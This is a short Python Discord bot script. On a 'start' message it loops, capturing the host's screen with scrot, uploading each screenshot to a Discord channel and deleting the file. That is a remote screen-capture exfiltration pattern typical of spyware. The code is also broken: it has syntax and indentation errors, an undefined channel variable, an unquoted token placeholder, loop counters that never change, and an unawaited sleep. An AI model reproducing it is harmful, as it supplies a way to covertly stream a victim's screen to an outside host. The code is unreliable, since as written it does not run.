import os
import discord
import asyncio
import nest_asyncio
nest_asyncio.apply()
intents = discord.Intents().default()
intents.message_content = True
client = discord.Client(intents=intents)
token = INSERTTOKENHERE
n = 1
i = 10
async def async_func():
 await asyncio.create_subprocess_shell('scrot screen.png')

async def async_func1():
 await asyncio.create_subprocess_shell('rm screen.png')
@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
@client.event
async def on_message(message)
 if message.content.startswith('start'):
  while True:
  if n > i:
   asyncio.run(async_func())
   await channel.send(file=discord.File('screen.png'))
   asyncio.run(async_func1())
  else:
   asyncio.sleep(0.5)
client.run(token)
